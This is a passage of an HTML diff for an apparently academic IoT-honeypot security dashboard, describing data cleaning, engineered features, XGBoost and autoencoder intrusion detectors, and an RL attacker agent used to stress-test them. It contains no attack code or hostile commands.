+      <div class="card" style="border-top:2px solid var(--accent2);cursor:pointer" onclick="go('train-def')">
+        <div class="ct" style="color:var(--accent2)">02 — Defensive AI</div>
+        <div style="font-family:'Bebas Neue',sans-serif;font-size:32px;color:var(--accent2);margin:10px 0;line-height:1">3<br><span style="font-size:18px">MODELS</span></div>
+        <div class="cd">XGBoost Binary (99%) · XGBoost Multi-Class (94%) · Autoencoder Anomaly Detector (95%). Real-time attack detection pipeline.</div>
+        <div style="font-family:'DM Mono',monospace;font-size:9px;color:var(--accent2);margin-top:14px;letter-spacing:2px">→ EXPLORE ›</div>
+      </div>
+      <div class="card" style="border-top:2px solid var(--red);cursor:pointer" onclick="go('train-off')">
+        <div class="ct" style="color:var(--red)">03 — Offensive RL</div>
+        <div style="font-family:'Bebas Neue',sans-serif;font-size:32px;color:var(--red);margin:10px 0;line-height:1">DQN<br><span style="font-size:18px">AGENT</span></div>
+        <div class="cd">18-action RL attacker trained across 3 modes — Simulation, Live Honeypot, Adversarial. Stress-tester for the defensive pipeline.</div>
+        <div style="font-family:'DM Mono',monospace;font-size:9px;color:var(--red);margin-top:14px;letter-spacing:2px">→ EXPLORE ›</div>
+      </div>
+    </div>
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:12px">Full AI Pipeline</div>
+    <div class="flow" style="margin-bottom:28px">
+      <div class="fs"><span class="fsi">🗄️</span><span class="fsn">Raw Data</span><span class="fsd">2.5M events · 6 indices</span></div>
+      <div class="fs" style="background:#0a1a0a"><span class="fsi">🧹</span><span class="fsn" style="color:#4ade80">Clean + Encode</span><span class="fsd">6 problems solved</span></div>
+      <div class="fs" style="background:#071420"><span class="fsi">🌲</span><span class="fsn" style="color:var(--accent)">XGBoost</span><span class="fsd">Binary 99% · Multi 94%</span></div>
+      <div class="fs" style="background:#061a0e"><span class="fsi">🧠</span><span class="fsn" style="color:#4ade80">Autoencoder</span><span class="fsd">Anomaly 95%</span></div>
+      <div class="fs" style="background:#1a0808"><span class="fsi">🤖</span><span class="fsn" style="color:var(--red)">RL Agent</span><span class="fsd">DQN · 3 modes</span></div>
+      <div class="fs"><span class="fsi">🔒</span><span class="fsn">Detection</span><span class="fsd">Real-time firewall</span></div>
+    </div>
+    <div class="cklist">
+      <div class="ck ok"><span class="cki">✓</span> XGBoost binary — 99% accuracy, F1/AUC ~0.99</div>
+      <div class="ck ok"><span class="cki">✓</span> XGBoost multi-class — 7 attack types, Macro F1 94%</div>
+      <div class="ck ok"><span class="cki">✓</span> Autoencoder anomaly detector — ROC AUC 95%</div>
+      <div class="ck ok"><span class="cki">✓</span> Autoencoder — zero-day capable, trained on benign only</div>
+      <div class="ck ok"><span class="cki">✓</span> RL agent — Gymnasium env · DQN · 18 actions · 24-dim state</div>
+      <div class="ck ok"><span class="cki">✓</span> RL agent — simulation 8% detect · live 0% detect · adversarial 100% detect</div>
+      <div class="ck ok"><span class="cki">✓</span> Adversarial result validates defensive AI strength</div>
+      <div class="ck ok"><span class="cki">✓</span> Pipeline integration — real-time detection at firewall</div>
+    </div>
+  </div>
+  <div class="pf"><div class="pfl">AI TRAINING // STAGE 04 — COMPLETE ✓</div><div class="pfr"><span class="ok">XGBoost Binary 99% · Multi 94% · Autoencoder 95% · RL DQN</span></div></div>
+</div>
+
+<!-- DATA SCIENCE SUB-PAGE -->
+<div id="pg-train-ds" class="pg">
+  <div class="ph">
+    <div class="ph-lbl">// AI Training — Part 01</div>
+    <div class="ph-title">Data <span>Science</span></div>
+    <div class="ph-sub">Export · Cleaning · Balancing · Feature Engineering — 2.5M → 244K clean rows</div>
+  </div>
+  <div class="sec">
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:12px">Dataset Overview</div>
+    <div class="grid g4" style="margin-bottom:28px">
+      <div class="card" style="border-top:2px solid #4ade80">
+        <div class="ct" style="color:#4ade80">Raw Dataset</div>
+        <div style="font-family:'Bebas Neue',sans-serif;font-size:32px;color:#4ade80;line-height:1;margin:8px 0">2.68M</div>
+        <div class="cd">rows × 47 columns · 648 MB · 6 Elasticsearch indices</div>
+      </div>
+      <div class="card" style="border-top:2px solid var(--accent)">
+        <div class="ct">Balanced Dataset</div>
+        <div style="font-family:'Bebas Neue',sans-serif;font-size:32px;color:var(--accent);line-height:1;margin:8px 0">244K</div>
+        <div class="cd">rows × 46 columns · 87.9 MB · ML ready</div>
+      </div>
+      <div class="card" style="border-top:2px solid var(--accent2)">
+        <div class="ct" style="color:var(--accent2)">Attack Events</div>
+        <div style="font-family:'Bebas Neue',sans-serif;font-size:32px;color:var(--accent2);line-height:1;margin:8px 0">35K</div>
+        <div class="cd">labeled attacks · 7 attack types + benign</div>
+      </div>
+      <div class="card" style="border-top:2px solid var(--purple)">
+        <div class="ct" style="color:var(--purple)">Protocols</div>
+        <div style="font-family:'Bebas Neue',sans-serif;font-size:32px;color:var(--purple);line-height:1;margin:8px 0">6</div>
+        <div class="cd">MQTT · HTTP · CoAP · SSH/Cowrie · Network · Platform</div>
+      </div>
+    </div>
+
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:12px">Export Pipeline — Raw Logs → CSV</div>
+    <div class="flow" style="margin-bottom:28px">
+      <div class="fs"><span class="fsi">🍯</span><span class="fsn">Honeypot</span><span class="fsd">MQTT · HTTP · CoAP · SSH</span></div>
+      <div class="fs" style="background:#0a1a0a"><span class="fsi">📄</span><span class="fsn" style="color:#4ade80">JSON Logs</span><span class="fsd">Filebeat → Logstash</span></div>
+      <div class="fs" style="background:#071420"><span class="fsi">🔍</span><span class="fsn" style="color:var(--accent)">Elasticsearch</span><span class="fsd">6 honeypot-* indices</span></div>
+      <div class="fs" style="background:#0a1a0a"><span class="fsi">⚙️</span><span class="fsn" style="color:#4ade80">Scroll API</span><span class="fsd">export_data.py · chunked CSV</span></div>
+      <div class="fs"><span class="fsi">📊</span><span class="fsn">Raw CSV</span><span class="fsd">648 MB · 47 columns</span></div>
+    </div>
+
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:12px">Problems Found &amp; Solutions Applied</div>
+
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--border);border:1px solid var(--border);margin-bottom:2px">
+      <div style="background:#1a0505;padding:20px 22px;border-left:3px solid var(--red)">
+        <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--red);margin-bottom:8px">PROBLEM 01 — CRITICAL · Severe Class Imbalance</div>
+        <div style="font-size:13px;color:#ddd;line-height:1.65">98.7% benign vs 1.3% attack in raw data (2.65M benign, 34K attack). A naive model achieves 98.7% accuracy by predicting all-benign — learning nothing useful. Standard training is completely useless.</div>
+      </div>
+      <div style="background:#0a1a0a;padding:20px 22px;border-left:3px solid #4ade80">
+        <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:#4ade80;margin-bottom:8px">SOLUTION — Two-Phase Rebalancing (Downsample + SMOTE)</div>
+        <div style="font-size:13px;color:#ddd;line-height:1.65">Downsample benign 2.65M → 75,600 (25K per major protocol). Then SMOTE each attack class to 12,000 samples with k_neighbors=3. SMOTE generates synthetic neighbors rather than exact copies — avoids overfitting while filling rare classes.</div>
+      </div>
+    </div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--border);border:1px solid var(--border);margin-bottom:2px">
+      <div style="background:#1a0505;padding:20px 22px;border-left:3px solid var(--red)">
+        <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--red);margin-bottom:8px">PROBLEM 02 — Protocol-Specific NaN (up to 80%+)</div>
+        <div style="font-size:13px;color:#ddd;line-height:1.65">Each log type only populates its own protocol fields. MQTT logs have NaN in all HTTP/CoAP columns and vice versa. Up to 80%+ NaN columns — expected by design, not data corruption.</div>
+      </div>
+      <div style="background:#0a1a0a;padding:20px 22px;border-left:3px solid #4ade80">
+        <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:#4ade80;margin-bottom:8px">SOLUTION — Context-Aware Fill with 0</div>
+        <div style="font-size:13px;color:#ddd;line-height:1.65">Fill protocol-specific NaN with 0 — semantically correct. Zero HTTP status code means "no HTTP interaction." An MQTT log doesn't have an http_method because it's not HTTP, so 0 is the right representation.</div>
+      </div>
+    </div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--border);border:1px solid var(--border);margin-bottom:2px">
+      <div style="background:#1a0505;padding:20px 22px;border-left:3px solid var(--red)">
+        <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--red);margin-bottom:8px">PROBLEM 03 — CSV Parsing Errors</div>
+        <div style="font-size:13px;color:#ddd;line-height:1.65">"Expected 48 fields, saw 52." HTTP user-agent strings containing commas (e.g. "Nmap Scripting Engine") were not properly quoted. Some Elasticsearch indices also returned extra unexpected fields beyond the expected schema.</div>
+      </div>
+      <div style="background:#0a1a0a;padding:20px 22px;border-left:3px solid #4ade80">
+        <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:#4ade80;margin-bottom:8px">SOLUTION — QUOTE_NONNUMERIC + Strict Column Filter</div>
+        <div style="font-size:13px;color:#ddd;line-height:1.65">Added csv.QUOTE_NONNUMERIC to handle embedded commas in string fields. Added strict column filtering in export_data.py — only columns in the expected COLUMN_ORDER are kept, extra ES fields silently ignored.</div>
+      </div>
+    </div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--border);border:1px solid var(--border);margin-bottom:2px">
+      <div style="background:#1a0505;padding:20px 22px;border-left:3px solid var(--red)">
+        <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--red);margin-bottom:8px">PROBLEM 04 — Data Leakage (100% fake accuracy)</div>
+        <div style="font-size:13px;color:#ddd;line-height:1.65">is_internal and is_known_device are perfect proxies — all benign is internal+known, all attacks are external+unknown. Model achieved 100% with zero real learning. SMOTE also injected "synthetic" string markers as categorical values, creating artifact one-hot columns.</div>
+      </div>
+      <div style="background:#0a1a0a;padding:20px 22px;border-left:3px solid #4ade80">
+        <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:#4ade80;margin-bottom:8px">SOLUTION — Drop Leaky Columns + Neutralize SMOTE Artifacts</div>
+        <div style="font-size:13px;color:#ddd;line-height:1.65">Dropped is_internal and is_known_device entirely. Replaced all "synthetic" SMOTE markers with np.nan before one-hot encoding to prevent artifact columns like mqtt_action_synthetic. After fix: accuracy dropped from fake 100% → realistic 99%.</div>
+      </div>
+    </div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--border);border:1px solid var(--border);margin-bottom:2px">
+      <div style="background:#1a0505;padding:20px 22px;border-left:3px solid var(--red)">
+        <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--red);margin-bottom:8px">PROBLEM 05 — Extremely Rare Attack Classes</div>
+        <div style="font-size:13px;color:#ddd;line-height:1.65">malware_download (1 sample) and post_exploit (20 samples) — too few for SMOTE which requires k_neighbors + 1 minimum. Cannot generate meaningful synthetic data from near-empty classes.</div>
+      </div>
+      <div style="background:#0a1a0a;padding:20px 22px;border-left:3px solid #4ade80">
+        <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:#4ade80;margin-bottom:8px">SOLUTION — Merge Into Parent Class</div>
+        <div style="font-size:13px;color:#ddd;line-height:1.65">malware_download → exploit · post_exploit → exploit. After merging, all classes have ≥30 real samples — enough for SMOTE with k_neighbors=3. Semantically correct: both are exploitation-phase activities.</div>
+      </div>
+    </div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--border);border:1px solid var(--border);margin-bottom:28px">
+      <div style="background:#1a0505;padding:20px 22px;border-left:3px solid var(--red)">
+        <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:var(--red);margin-bottom:8px">PROBLEM 06 — Extreme Outliers Distorting Scaling</div>
+        <div style="font-size:13px;color:#ddd;line-height:1.65">payload_size, bytes_sent, bytes_received had extreme right-skew. Single entries with bytes_sent > 1 GB (logging errors or DDoS floods). MinMaxScaler compressed 99% of values into a near-zero band.</div>
+      </div>
+      <div style="background:#0a1a0a;padding:20px 22px;border-left:3px solid #4ade80">
+        <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:2px;color:#4ade80;margin-bottom:8px">SOLUTION — 99th Percentile Clipping</div>
+        <div style="font-size:13px;color:#ddd;line-height:1.65">Cap all numeric columns at 99th percentile using np.clip before feature engineering. Preserves the overall distribution shape while preventing extreme values from distorting the entire feature space.</div>
+      </div>
+    </div>
+
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:12px">Feature Engineering — 10 New Features</div>
+    <div style="background:var(--card);border:1px solid var(--border);overflow:hidden;margin-bottom:28px">
+      <table class="tbl" style="width:100%">
+        <thead><tr><th>Feature</th><th>Formula</th><th>Rationale</th></tr></thead>
+        <tbody>
+          <tr><td style="color:var(--accent);font-family:'DM Mono',monospace;font-size:10px">bytes_ratio</td><td>bytes_sent / (bytes_recv + 1)</td><td>Attackers send far more than they receive (recon, flooding)</td></tr>
+          <tr><td style="color:var(--accent);font-family:'DM Mono',monospace;font-size:10px">total_bytes</td><td>bytes_sent + bytes_received</td><td>DDoS and scans generate high total byte counts</td></tr>
+          <tr><td style="color:var(--accent);font-family:'DM Mono',monospace;font-size:10px">src_port_class</td><td>0=well-known ≤1023 · 1=registered · 2=dynamic</td><td>Well-known source ports are unusual — potential spoofing</td></tr>
+          <tr><td style="color:var(--accent);font-family:'DM Mono',monospace;font-size:10px">dst_port_class</td><td>Same bucketing for destination port</td><td>Attacks target well-known service ports (80, 22, 1883…)</td></tr>
+          <tr><td style="color:var(--accent);font-family:'DM Mono',monospace;font-size:10px">mqtt_session_intensity</td><td>msg_rate × session_msg_count</td><td>Captures both speed AND volume of MQTT abuse simultaneously</td></tr>
+          <tr><td style="color:var(--accent);font-family:'DM Mono',monospace;font-size:10px">http_session_intensity</td><td>req_rate × session_req_count</td><td>Captures both speed AND volume of HTTP abuse simultaneously</td></tr>
+          <tr><td style="color:var(--accent);font-family:'DM Mono',monospace;font-size:10px">payload_bytes_ratio</td><td>payload_size / (total_bytes + 1)</td><td>Malformed packets show unusual payload-to-total ratios</td></tr>
+          <tr><td style="color:var(--accent);font-family:'DM Mono',monospace;font-size:10px">msg_rate_per_min_high</td><td>1 if rate &gt; 90th percentile</td><td>Binary flag for abnormally fast MQTT messaging</td></tr>
+          <tr><td style="color:var(--accent);font-family:'DM Mono',monospace;font-size:10px">req_rate_per_min_high</td><td>1 if rate &gt; 90th percentile</td><td>Binary flag for abnormally fast HTTP requests</td></tr>
+          <tr><td style="color:var(--accent);font-family:'DM Mono',monospace;font-size:10px">session_diversity</td><td>topic_count + endpoint_count + path_count</td><td>Scanning attackers visit many different resources</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:12px">End-to-End Pipeline — 19 Steps</div>
+    <div style="background:#020c08;border:1px solid #1a3a28;border-left:3px solid #4ade80;padding:24px 28px;margin-bottom:28px;font-family:'DM Mono',monospace;font-size:11px;line-height:2.1;color:#b0c8bc">
+      <div><span style="color:#4ade80">01</span> <span style="color:var(--muted)">—</span> Load CSV (244,085 × 46)</div>
+      <div><span style="color:#4ade80">02</span> <span style="color:var(--muted)">—</span> Replace "synthetic" / "null" markers → np.nan</div>
+      <div><span style="color:#4ade80">03</span> <span style="color:var(--muted)">—</span> Drop identifier columns (IPs, timestamps, client_id, topic…)</div>
+      <div><span style="color:#4ade80">04</span> <span style="color:var(--muted)">—</span> <span style="color:var(--red)">Drop leakage columns</span> (is_internal, is_known_device)</div>
+      <div><span style="color:#4ade80">05</span> <span style="color:var(--muted)">—</span> Remove exact duplicate rows (Filebeat re-delivery artifacts)</div>
+      <div><span style="color:#4ade80">06</span> <span style="color:var(--muted)">—</span> Boolean unification → float 0.0 / 1.0</div>
+      <div><span style="color:#4ade80">07</span> <span style="color:var(--muted)">—</span> Numeric type coercion (pd.to_numeric, errors='coerce')</div>
+      <div><span style="color:#4ade80">08</span> <span style="color:var(--muted)">—</span> Outlier clipping at 99th percentile</div>
+      <div><span style="color:#4ade80">09</span> <span style="color:var(--muted)">—</span> Fill remaining NaN → 0</div>
+      <div><span style="color:#4ade80">10</span> <span style="color:var(--muted)">—</span> Feature engineering (10 new engineered features)</div>
+      <div><span style="color:#4ade80">11</span> <span style="color:var(--muted)">—</span> One-hot encode categoricals</div>
+      <div><span style="color:#4ade80">12</span> <span style="color:var(--muted)">—</span> Variance threshold 0.01 — drop near-constant columns</div>
+      <div><span style="color:#4ade80">13</span> <span style="color:var(--muted)">—</span> Pearson correlation pruning (r > 0.95) — ~30% dimensionality reduction</div>
+      <div><span style="color:#4ade80">14</span> <span style="color:var(--muted)">—</span> Train/test split (80/20 stratified on attack_type)</div>
+      <div><span style="color:#4ade80">15</span> <span style="color:var(--muted)">—</span> MinMax normalization for autoencoder (fitted on benign-only train set)</div>
+      <div><span style="color:#4ade80">16</span> <span style="color:var(--muted)">—</span> Z-score standardization for XGBoost (stabilizes hyperparameter search)</div>
+      <div><span style="color:#4ade80">17</span> <span style="color:var(--muted)">—</span> Model training + RandomizedSearchCV</div>
+      <div><span style="color:#4ade80">18</span> <span style="color:var(--muted)">—</span> 5-fold stratified cross-validation</div>
+      <div><span style="color:#4ade80;font-weight:bold">19</span> <span style="color:var(--muted)">—</span> <span style="color:#4ade80;font-weight:bold">Evaluation · confusion matrix · ROC · PR curve · feature importance · save models</span></div>
+    </div>
+  </div>
+  <div class="pf"><div class="pfl">DATA SCIENCE // AI TRAINING — PART 01</div><div class="pfr"><span style="color:#4ade80">244,085 rows · 10 features engineered · 6 problems solved</span></div></div>
+</div>
+
+<!-- DEFENSIVE AI SUB-PAGE -->
+<div id="pg-train-def" class="pg">
+  <div class="ph">
+    <div class="ph-lbl">// AI Training — Part 02</div>
+    <div class="ph-title">Defensive <span>AI</span></div>
+    <div class="ph-sub">XGBoost Binary · XGBoost Multi-Class · Autoencoder Anomaly Detector</div>
+  </div>
+  <div class="sec">
+    <div class="grid g3" style="margin-bottom:28px">
+      <div class="card" style="border-top:2px solid var(--accent);text-align:center">
+        <div class="ct">XGBoost Binary</div>
+        <div style="font-family:'Bebas Neue',sans-serif;font-size:64px;color:var(--accent);line-height:1;margin:10px 0;text-shadow:0 0 30px rgba(0,229,195,.2)">99<span style="font-size:32px">%</span></div>
+        <div class="cd">Attack vs Benign · F1 / ROC AUC ~0.99</div>
+      </div>
+      <div class="card" style="border-top:2px solid var(--accent2);text-align:center">
+        <div class="ct" style="color:var(--accent2)">XGBoost Multi-Class</div>
+        <div style="font-family:'Bebas Neue',sans-serif;font-size:64px;color:var(--accent2);line-height:1;margin:10px 0;text-shadow:0 0 30px rgba(96,165,250,.2)">94<span style="font-size:32px">%</span></div>
+        <div class="cd">7 attack types + benign · Macro F1 ~0.94</div>
+      </div>
+      <div class="card" style="border-top:2px solid var(--purple);text-align:center">
+        <div class="ct" style="color:var(--purple)">Autoencoder</div>
+        <div style="font-family:'Bebas Neue',sans-serif;font-size:64px;color:var(--purple);line-height:1;margin:10px 0;text-shadow:0 0 30px rgba(192,132,252,.2)">95<span style="font-size:32px">%</span></div>
+        <div class="cd">Anomaly detection · ROC AUC · Zero-day capable</div>
+      </div>
+    </div>
+
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:12px">Model 01 — XGBoost Binary Classifier</div>
+    <div style="background:#020810;border:1px solid #1a2a3a;border-left:3px solid var(--accent2);padding:18px 24px;margin-bottom:12px;font-family:'DM Mono',monospace;font-size:11px;line-height:2;color:#aac0d8">
+      <div style="font-size:9px;letter-spacing:3px;color:var(--accent2);margin-bottom:10px">// PREPROCESSING — XGBoost BINARY</div>
+      <div><span style="color:var(--accent2)">›</span> Drop leakage columns (is_internal, is_known_device) — was causing fake 100% accuracy</div>
+      <div><span style="color:var(--accent2)">›</span> Encode categoricals · protocol → {0:MQTT, 1:CoAP, 2:HTTP, 3:SSH} · attack_type → ordinal</div>
+      <div><span style="color:var(--accent2)">›</span> Feature set → 8 base features + 10 engineered · scale_pos_weight for imbalance</div>
+    </div>
+    <div class="layers" style="margin-bottom:28px">
+      <div class="layer">
+        <div class="ll"><span class="lnum">SUPERVISED</span><div class="lname" style="color:var(--accent)">XGBoost<br>Binary</div></div>
+        <div class="lr"><div style="width:100%">
+          <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:1px;background:var(--border);margin-bottom:12px">
+            <div style="background:var(--bg);padding:14px"><div style="font-family:'DM Mono',monospace;font-size:9px;color:var(--accent);margin-bottom:4px">TARGET</div><div style="font-size:13px;color:#f1f5f9">attack / benign</div></div>
+            <div style="background:var(--bg);padding:14px"><div style="font-family:'DM Mono',monospace;font-size:9px;color:var(--accent);margin-bottom:4px">OBJECTIVE</div><div style="font-size:13px;color:#f1f5f9">binary:logistic</div></div>
+            <div style="background:#0a1a12;padding:14px;border-left:2px solid var(--accent)"><div style="font-family:'DM Mono',monospace;font-size:9px;color:var(--accent);margin-bottom:4px">ACCURACY</div><div style="font-family:'Bebas Neue',sans-serif;font-size:28px;color:var(--accent);line-height:1">99%</div></div>
+          </div>
+          <div class="note">XGBoost excels at tabular IoT data — outperforms deep learning on structured features. Accuracy confirmed at 99% after removing data leakage. scale_pos_weight handles remaining class imbalance.</div>
+        </div></div>
+      </div>
+    </div>
+
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:12px">Model 02 — XGBoost Multi-Class Classifier</div>
+    <div class="layers" style="margin-bottom:28px">
+      <div class="layer">
+        <div class="ll"><span class="lnum">SUPERVISED</span><div class="lname" style="color:var(--accent2)">XGBoost<br>Multi</div></div>
+        <div class="lr"><div style="width:100%">
+          <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:1px;background:var(--border);margin-bottom:12px">
+            <div style="background:var(--bg);padding:14px"><div style="font-family:'DM Mono',monospace;font-size:9px;color:var(--accent2);margin-bottom:4px">OBJECTIVE</div><div style="font-size:13px;color:#f1f5f9">multi:softprob</div></div>
+            <div style="background:var(--bg);padding:14px"><div style="font-family:'DM Mono',monospace;font-size:9px;color:var(--accent2);margin-bottom:4px">CLASSES</div><div style="font-size:13px;color:#f1f5f9">8 (7 attack + benign)</div></div>
+            <div style="background:#071220;padding:14px;border-left:2px solid var(--accent2)"><div style="font-family:'DM Mono',monospace;font-size:9px;color:var(--accent2);margin-bottom:4px">MACRO F1</div><div style="font-family:'Bebas Neue',sans-serif;font-size:28px;color:var(--accent2);line-height:1">94%</div></div>
+          </div>
+          <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px">
+            <span class="chip" style="border-color:#004433;color:var(--accent)">bruteforce</span><span class="chip" style="border-color:#004433;color:var(--accent)">port_scan</span><span class="chip" style="border-color:#004433;color:var(--accent)">mqtt_injection</span><span class="chip" style="border-color:#004433;color:var(--accent)">coap_flood</span><span class="chip" style="border-color:#004433;color:var(--accent)">http_exploit</span><span class="chip" style="border-color:#004433;color:var(--accent)">ddos</span><span class="chip" style="border-color:#004433;color:var(--accent)">reconnaissance</span><span class="chip" style="border-color:#333;color:var(--muted)">benign</span>
+          </div>
+          <div class="note">LabelEncoder saved for decoding predictions. Per-protocol SMOTE ensures all 8 classes equally represented. Macro F1 94% accounts for the hardest minority classes.</div>
+        </div></div>
+      </div>
+    </div>
+
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:12px">Model 03 — Autoencoder Anomaly Detector</div>
+    <div style="background:#020f08;border:1px solid #1a3a1a;border-left:3px solid #4ade80;padding:18px 24px;margin-bottom:12px;font-family:'DM Mono',monospace;font-size:11px;line-height:2;color:#a0c8a0">
+      <div style="font-size:9px;letter-spacing:3px;color:#4ade80;margin-bottom:10px">// KEY CONSTRAINT — Fitted on BENIGN TRAFFIC ONLY</div>
+      <div><span style="color:#4ade80">›</span> MinMaxScaler fitted ONLY on benign training data — attack data must not influence the scaler</div>
+      <div><span style="color:#4ade80">›</span> If attack data influenced scaler, attacks could appear "normal" after scaling → detection power lost</div>
+      <div><span style="color:#4ade80">›</span> Learns to reconstruct normal IoT behavior — high reconstruction error = anomaly</div>
+    </div>
+    <div class="layers" style="margin-bottom:28px">
+      <div class="layer">
+        <div class="ll"><span class="lnum">UNSUPERVISED</span><div class="lname" style="color:#4ade80">Autoencoder</div></div>
+        <div class="lr"><div style="width:100%">
+          <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--border);margin-bottom:12px">
+            <div style="background:var(--bg);padding:12px;text-align:center"><div style="font-family:'DM Mono',monospace;font-size:9px;color:var(--muted);margin-bottom:4px">ENCODER</div><div style="font-size:12px;color:#f1f5f9">→ 64 → 32 → 16</div></div>
+            <div style="background:#0a1a12;padding:12px;text-align:center;border-left:2px solid #4ade80;border-right:2px solid #4ade80"><div style="font-family:'DM Mono',monospace;font-size:9px;color:#4ade80;margin-bottom:4px">LATENT</div><div style="font-family:'Bebas Neue',sans-serif;font-size:22px;color:#4ade80">8</div></div>
+            <div style="background:var(--bg);padding:12px;text-align:center"><div style="font-family:'DM Mono',monospace;font-size:9px;color:var(--muted);margin-bottom:4px">DECODER</div><div style="font-size:12px;color:#f1f5f9">16 → 32 → 64 →</div></div>
+            <div style="background:#0f0720;padding:12px;text-align:center;border-left:2px solid var(--purple)"><div style="font-family:'DM Mono',monospace;font-size:9px;color:var(--purple);margin-bottom:4px">ROC AUC</div><div style="font-family:'Bebas Neue',sans-serif;font-size:22px;color:var(--purple)">95%</div></div>
+          </div>
+          <div style="background:var(--bg);padding:12px 16px;border-left:2px solid #4ade80;margin-bottom:10px">
+            <div style="font-family:'DM Mono',monospace;font-size:9px;color:#4ade80;margin-bottom:4px">DETECTION LOGIC — ZERO-DAY CAPABLE</div>
+            <div style="font-size:13px;color:#f1f5f9">Trained on benign traffic only → learns normal IoT behavior → flags events with high reconstruction error as anomalies. No attack labels needed. Catches novel attacks the XGBoost classifiers have never seen.</div>
+          </div>
+          <div class="note">Works in parallel with XGBoost — any of the three models flagging an event triggers a defensive alert. Ensemble approach provides layered protection.</div>
+        </div></div>
+      </div>
+    </div>
+
+    <div class="hl">
+      <div class="hlt">// Three Models — One Pipeline</div>
+      <div class="hld">In adversarial mode all three models score every network event simultaneously. <strong>Any single model detecting an attack triggers the defensive response.</strong> This ensemble catches attacks that fool one model but not the others — including zero-day patterns the XGBoost classifiers haven't seen (handled by the autoencoder's reconstruction error threshold).</div>
+    </div>
+  </div>
+  <div class="pf"><div class="pfl">DEFENSIVE AI // AI TRAINING — PART 02</div><div class="pfr"><span class="ok">XGBoost Binary 99% · Multi-Class 94% · Autoencoder 95%</span></div></div>
+</div>
+
+<!-- OFFENSIVE RL SUB-PAGE -->
+<div id="pg-train-off" class="pg">
+  <div class="ph">
+    <div class="ph-lbl">// AI Training — Part 03</div>
+    <div class="ph-title">Offensive <span>RL</span></div>
+    <div class="ph-sub">DQN Agent · 18 Actions · 3 Modes — Simulation · Live Honeypot · Adversarial</div>
+  </div>
+  <div class="sec">
+    <div class="hl" style="margin-bottom:28px">
+      <div class="hlt">// Role — Defensive Stress-Tester, Not Full Pentester</div>
+      <div class="hld">The RL agent's <strong>primary purpose</strong> is adversarial traffic generation that challenges the defensive detection pipeline. It does not simulate a full kill-chain (recon → exploit → persist → exfiltrate). It selects individual attack primitives to maximise reward. The offensive system is the evaluation tool — <strong>the defensive AI is the core contribution.</strong></div>
+    </div>
+
+    <div class="grid g4" style="margin-bottom:28px">
+      <div class="card" style="border-top:2px solid var(--red)"><div class="ct" style="color:var(--red)">Architecture</div><div style="font-family:'Bebas Neue',sans-serif;font-size:28px;color:var(--red);line-height:1;margin:8px 0">DQN</div><div class="cd">stable-baselines3 · Deep Q-Network · Gymnasium env</div></div>
+      <div class="card" style="border-top:2px solid var(--orange)"><div class="ct" style="color:var(--orange)">Action Space</div><div style="font-family:'Bebas Neue',sans-serif;font-size:28px;color:var(--orange);line-height:1;margin:8px 0">18</div><div class="cd">Discrete attack primitives across 5 protocols</div></div>
+      <div class="card" style="border-top:2px solid var(--purple)"><div class="ct" style="color:var(--purple)">Observation</div><div style="font-family:'Bebas Neue',sans-serif;font-size:28px;color:var(--purple);line-height:1;margin:8px 0">24</div><div class="cd">Dimensional continuous state space</div></div>
+      <div class="card" style="border-top:2px solid var(--accent2)"><div class="ct" style="color:var(--accent2)">Modes</div><div style="font-family:'Bebas Neue',sans-serif;font-size:28px;color:var(--accent2);line-height:1;margin:8px 0">3</div><div class="cd">Simulation · Live Honeypot · Adversarial</div></div>
+    </div>
+
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:12px">Evaluation Results — HARD Difficulty (50 Episodes)</div>
+    <div style="display:flex;flex-direction:column;gap:1px;background:var(--border);border:1px solid var(--border);margin-bottom:28px">
+      <div style="display:grid;grid-template-columns:150px 1fr;gap:1px;background:var(--border)">
+        <div style="background:#070f07;padding:20px;border-left:3px solid #4ade80">
